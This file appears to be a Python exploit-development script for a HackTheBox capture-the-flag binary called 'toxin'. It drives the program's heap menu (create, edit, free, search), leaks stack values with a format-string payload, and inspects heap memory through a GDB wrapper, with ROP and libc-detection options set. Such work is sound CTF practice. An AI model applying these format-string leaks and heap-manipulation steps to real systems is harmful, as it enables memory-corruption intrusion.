import dataclasses
import ipaddress
import pathlib
import re
import string
from time import sleep

from loguru import logger

from core.gdb_wrapper import GdbWrapper
from core.target_config import Config, Mode
from core.targetbase import TargetBase



def create_toxin(index: int, size: int, data: bytes):
    print(t.process.clean(0.2).decode(), "1")
    t.process.sendline(b"1")
    print(t.process.clean(0.2).decode(), hex(size))
    t.process.sendline(str(size).encode())
    print(t.process.clean(0.2).decode(), hex(index))
    t.process.sendline(str(index).encode())
    print(t.process.clean(0.2).decode(), data)
    t.process.sendline(data)


def search_toxin(data: bytes):
    print(t.process.clean(0.2).decode(), "4")
    t.process.sendline(b"4")
    print(t.process.clean(0.2).decode(), data)
    t.process.sendline(data)
    result = t.process.recvline()
    print(result)
    if b'not found' in result:
        return None
    return result


def free_toxin(index: int):
    print(t.process.clean(0.2).decode(), "3")
    t.process.sendline(b"3")
    print(t.process.clean(0.2).decode(), hex(index))
    t.process.sendline(str(index).encode())


def edit_toxin(index: int, data: bytes):
    print(t.process.clean(0.2).decode(), "2")
    t.process.sendline(b"2")
    print(t.process.clean(0.2).decode(), hex(index))
    t.process.sendline(str(index).encode())
    print(t.process.clean(0.2).decode(), data)
    t.process.sendline(data)

def read_stack(pos: int=0):
    print(t.process.clean(0.2).decode(), "4")
    t.process.sendline(b"4")
    data = f"%{pos}$p"
    print(t.process.clean(0.2).decode(), data)
    t.process.sendline(data.encode())
    result = t.process.recvline()
    match = re.search(f'(0x[{string.hexdigits}]+)', result.decode())
    if match:
        print(match[1])
        return match[1]
    print(result)
    return None


if __name__ == '__main__':
    remote_config = Config(
        rop=True,
        mode=Mode.local,
        ip=ipaddress.IPv4Address('142.93.34.45'),
        port=30006,
        file=pathlib.Path('/home/lim8en1/htb/projects/toxin/toxin_mod'),
        no_offset=True,
        detect_libc=True
    )

    signatures = (b'\xDE', b'\xC0', b'\xCA')
    max_allocate_size = 0xE0
    t = TargetBase(config=remote_config)

    stack = []
    for pos in range(1, 20):
        result = read_stack(pos)
        stack.append(result)
    logger.debug("\n".join(f"{i}:{x}" if x else f"{i}:(null)" for i, x in enumerate(stack)))

    sizes = (0x28, 0x17, 0x19)
    indices = (0, 1, 2)
    index_to_free = 0
    for index in indices:
        create_toxin(index, sizes[index], data=signatures[index] + str(index).encode() * 4 + b'\0')
        if index == index_to_free:
            free_toxin(index)
    stack = []
    for pos in range(1, 20):
        result = read_stack(pos)
        stack.append(result)
    logger.debug("\n".join(f"{i}:{x}" if x else f"{i}:(null)" for i, x in enumerate(stack)))

    with GdbWrapper(t.process.pid) as debugger:
        debugger.resume()
        debugger.interrupt()
        toxin_freed = debugger.read_value('(long int)&toxinfreed')
        logger.debug(f"Toxin freed @ {toxin_freed}")
        sizes_address = debugger.read_value('(long int)&toxins')
        logger.debug(f"Values @ {sizes_address}")
        values = debugger.read_memory('(long int)&toxins', count=3, modifier='g')
        sizes_address = debugger.read_value('(long int)&sizes')
        logger.debug(f"Sizes @ {sizes_address}")
        sizes_read = debugger.read_memory('(long int)&sizes', count=3, modifier='g')

        for index in indices:
            address = values[index]
            data = bytearray(sizes_read[index])
            data_as_list = debugger.read_memory(address, count=sizes_read[index])
            logger.debug(f"Address: {hex(address)}")
            for i, byte in enumerate(data_as_list):
                data[i] = byte
            pos = 0
            while pos < len(data):
                logger.debug(" ".join(f'{x:02x}' for x in data[pos:pos+0x10]))
                pos += 0x10
        debugger.resume()